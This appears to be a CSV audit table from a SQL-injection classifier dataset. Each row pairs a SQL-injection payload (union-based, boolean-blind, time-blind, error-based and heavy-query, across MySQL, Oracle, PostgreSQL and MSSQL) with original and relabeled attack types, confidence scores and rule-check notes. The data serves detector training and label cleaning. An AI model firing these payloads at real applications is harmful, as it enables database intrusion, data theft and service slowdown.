"1"" ) where 2088 = 2088 union all select null,null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1"" ) where 2088 = 2088 union all select null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-2230%"" union all select 3303,3303,3303--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-2230%"" union all select 3303,3303,3303--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1"" ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"-4418"" or 6872 = 6872 and ""gbut"" = ""gbut",boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,"-4418"" or 6872 = 6872 and ""gbut"" = ""gbut",False,0,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
select sleep ( 5 ) and ( ( 'wyvx' = 'wyvx,time_blind,mysql,0.9,sleep_time,RELABEL,reasoning too short (10 chars),time_blind,mysql,select sleep ( 5 ) and ( ( 'wyvx' = 'wyvx,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1"" ) ) as xhat where 6674 = 6674 union all select null,null,null#",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1"" ) ) as xhat where 6674 = 6674 union all select null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1'|| ( select 'brde' where 7390 = 7390 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ||',out_of_band,oracle,0.9,utl_inaddr,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,1'|| ( select 'brde' where 7390 = 7390 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ||',False,0,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected
"1%"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""%"" = """,heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1%"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""%"" = """,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
1' where 9242 = 9242,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1' where 9242 = 9242,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
"-6041' ) ) or make_set ( 9835 = 1367,1367 ) and ( ( 'hxjf' = 'hxjf",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"-6041' ) ) or make_set ( 9835 = 1367,1367 ) and ( ( 'hxjf' = 'hxjf",False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"1"" ) as jask where 7629 = 7629 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,"1"" ) as jask where 7629 = 7629 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
"-5235 ) or make_set ( 9354 = 9354,7185 )",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"-5235 ) or make_set ( 9354 = 9354,7185 )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"-9820"" or 1038 = 7502#",boolean_blind,generic,0.5,or_inequality,RELABEL,reasoning too short (13 chars); confidence too low (0.50),boolean_blind,generic,"-9820"" or 1038 = 7502#",False,0,boolean_blind,generic,Pattern match: 'or 1038 = 7502' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"1 ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 9462 = 9462",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1 ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 9462 = 9462",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1'+ ( select 'usoq' where 7783 = 7783 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) ) +'",error_based,mysql,0.9,updatexml,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1'+ ( select 'usoq' where 7783 = 7783 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) ) +'",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1"" ) and 7533 = 7533 and ( ""jfsw"" like ""jfsw",boolean_blind,generic,0.5,and_equality,RELABEL,reasoning too short (12 chars); confidence too low (0.50),boolean_blind,generic,"1"" ) and 7533 = 7533 and ( ""jfsw"" like ""jfsw",False,0,boolean_blind,generic,Pattern match: 'and 7533 = 7533' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"1%' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and '%' = '",heavy_query,postgresql,0.7,generate_series,RELABEL,reasoning too short (15 chars),heavy_query,postgresql,"1%' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and '%' = '",False,0,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload)
-5852 ) as anca where 3574 = 3574 or 3958 = 5536#,boolean_blind,generic,0.5,or_inequality,RELABEL,reasoning too short (13 chars); confidence too low (0.50),boolean_blind,generic,-5852 ) as anca where 3574 = 3574 or 3958 = 5536#,False,0,boolean_blind,generic,Pattern match: 'or 3958 = 5536' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"( select 1 from generate_series ( 8515,8515,case when ( 8515 = 3477 ) then 1 else 0 end ) limit 1 )",heavy_query,postgresql,0.7,generate_series,RELABEL,reasoning too short (15 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,postgresql,"( select 1 from generate_series ( 8515,8515,case when ( 8515 = 3477 ) then 1 else 0 end ) limit 1 )",False,0,boolean_blind,postgresql,generic SQL keywords without specific signal,boolean_blind,postgresql,generic SQL structure without strong signal
"1%"" ) ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.7,mssql_sysjoin,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1%"" ) ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"-2840' ) ) ) union all select 3025,3025,3025,3025--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-2840' ) ) ) union all select 3025,3025,3025,3025--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
select case when 5346 = 8272 then 1 else null end--,boolean_blind,generic,0.5,case_null,RELABEL,reasoning too short (9 chars); confidence too low (0.50),boolean_blind,generic,select case when 5346 = 8272 then 1 else null end--,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select sleep ( 5 ) and ""oivc"" like ""oivc",time_blind,mysql,0.9,sleep_time,RELABEL,reasoning too short (10 chars),time_blind,mysql,"select sleep ( 5 ) and ""oivc"" like ""oivc",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1' ) ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1' ) ) union all select null,null,null,null,null,null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1 ) as eryo where 2531 = 2531 rlike sleep ( 5 ) --,time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars),time_blind,mysql,1 ) as eryo where 2531 = 2531 rlike sleep ( 5 ) --,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
"-2912"" ) as eizh where 2223 = 2223 or make_set ( 1041 = 3056,3056 ) --",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"-2912"" ) as eizh where 2223 = 2223 or make_set ( 1041 = 3056,3056 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1'|| ( select 'skds' from dual where 8594 = 8594 and make_set ( 6779 = 2027,2027 ) ) ||'",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"1'|| ( select 'skds' from dual where 8594 = 8594 and make_set ( 6779 = 2027,2027 ) ) ||'",False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
"1%' union all select null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1%' union all select null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1"" ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
1' ) as imgv where 7802 = 7802,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1' ) as imgv where 7802 = 7802,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
1'+ ( select 'vidl' where 9445 = 9445 and 5498 = 5777#,boolean_blind,generic,0.5,inequality,RELABEL,reasoning too short (10 chars); confidence too low (0.50),boolean_blind,generic,1'+ ( select 'vidl' where 9445 = 9445 and 5498 = 5777#,False,0,boolean_blind,generic,Pattern match: 'and 5498 = 5777' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"1 ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 4277 = 4277",heavy_query,postgresql,0.7,generate_series,RELABEL,reasoning too short (15 chars),heavy_query,postgresql,"1 ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 4277 = 4277",False,0,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload)
"1%' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and '%' = '",boolean_blind,mysql,0.7,row_count,RELABEL,reasoning too short (9 chars),boolean_blind,mysql,"1%' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and '%' = '",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1%' union all select null,null,null,null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1%' union all select null,null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-4072%"" ) ) ) or 3999 = 1979",boolean_blind,generic,0.5,or_inequality,RELABEL,reasoning too short (13 chars); confidence too low (0.50),boolean_blind,generic,"-4072%"" ) ) ) or 3999 = 1979",False,0,boolean_blind,generic,Pattern match: 'or 3999 = 1979' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" and sleep ( 5 ) #",time_blind,mysql,0.9,sleep_time,RELABEL,reasoning too short (10 chars),time_blind,mysql,"1"" and sleep ( 5 ) #",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
"1"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""kpwc"" like ""kpwc",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""kpwc"" like ""kpwc",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"-4728"" ) ) as ndri where 3278 = 3278 or make_set ( 9354 = 9354,7185 ) --",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"-4728"" ) ) as ndri where 3278 = 3278 or make_set ( 9354 = 9354,7185 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1"" ) as obbk where 6414 = 6414 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,mysql,0.7,count_concat,RELABEL,reasoning too short (12 chars),boolean_blind,mysql,"1"" ) as obbk where 6414 = 6414 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1"" ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ""ppml"" = ""ppml",time_blind,generic,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,generic,"1"" ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ""ppml"" = ""ppml",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1"" ) as zbhs where 2017 = 2017 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",boolean_blind,mysql,0.7,row_count,RELABEL,reasoning too short (9 chars),boolean_blind,mysql,"1"" ) as zbhs where 2017 = 2017 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"-1106' ) ) union all select 2855,2855,2855,2855,2855,2855,2855#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-1106' ) ) union all select 2855,2855,2855,2855,2855,2855,2855#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"waitfor delay '0:0:5' and ( ( ""zili"" like ""zili",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'waitfor' (likely false negative),time_blind,mssql,"waitfor delay '0:0:5' and ( ( ""zili"" like ""zili",False,0,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected
"1%' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( '%' = '",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'benchmark' (likely false negative),time_blind,mysql,"1%' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( '%' = '",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ""ljkg"" = ""ljkg",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'dbms_pipe' (likely false negative),time_blind,oracle,"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ""ljkg"" = ""ljkg",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
"1%"" union all select null,null,null,null,null,null,null,null,null,null--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1%"" union all select null,null,null,null,null,null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1' in boolean mode ) waitfor delay '0:0:5'--,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'waitfor' (likely false negative),time_blind,mssql,1' in boolean mode ) waitfor delay '0:0:5'--,False,0,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected
"1%"" ) ) ) union all select null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1%"" ) ) ) union all select null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-8888%' ) union all select 5312,5312,5312,5312,5312,5312,5312,5312--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-8888%' ) union all select 5312,5312,5312,5312,5312,5312,5312,5312--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( ""dnlz"" = ""dnlz",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'dbms_pipe' (likely false negative),time_blind,oracle,"1"" ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( ""dnlz"" = ""dnlz",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'stea' = 'stea,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'stea' = 'stea,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"-1490'|| ( select 'uzbm' from dual where 3181 = 3181 union all select 3181,3181,3181,3181,3181--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,oracle,"-1490'|| ( select 'uzbm' from dual where 3181 = 3181 union all select 3181,3181,3181,3181,3181--",False,0,union_based,oracle,Pattern match: 'union all select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure
"1"" ) where 5794 = 5794 union all select null,null,null,null,null,null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1"" ) where 5794 = 5794 union all select null,null,null,null,null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-5891 ) where 5792 = 5792 union all select 5792,5792,5792,5792,5792#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-5891 ) where 5792 = 5792 union all select 5792,5792,5792,5792,5792#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1%"" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( ""%"" = """,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,"1%"" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( ""%"" = """,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
1'|| ( select 'xglm' from dual where 3556 = 3556 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,oracle,1'|| ( select 'xglm' from dual where 3556 = 3556 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,False,0,time_blind,oracle,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
"1"" ) ) and sleep ( 5 ) and ( ( ""timv"" = ""timv",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,"1"" ) ) and sleep ( 5 ) and ( ( ""timv"" = ""timv",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
"-7544"" ) ) union all select 3808,3808,3808,3808--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-7544"" ) ) union all select 3808,3808,3808,3808--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-7032' ) as xmmm where 5635 = 5635 union all select 5635,5635,5635,5635,5635--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-7032' ) as xmmm where 5635 = 5635 union all select 5635,5635,5635,5635,5635--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
waitfor delay '0:0:5' and ( ( ( 'hrta' = 'hrta,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'waitfor' (likely false negative),time_blind,mssql,waitfor delay '0:0:5' and ( ( ( 'hrta' = 'hrta,False,0,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected
"1' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and 'lgat' like 'lgat",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'extractvalue' (likely false negative),boolean_blind,mysql,"1' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and 'lgat' like 'lgat",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1"" ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,postgresql,"1"" ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",False,0,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal
"-9389' where 5713 = 5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-9389' where 5713 = 5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ""ponv"" = ""ponv",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),boolean_blind,mysql,"1"" ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ""ponv"" = ""ponv",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
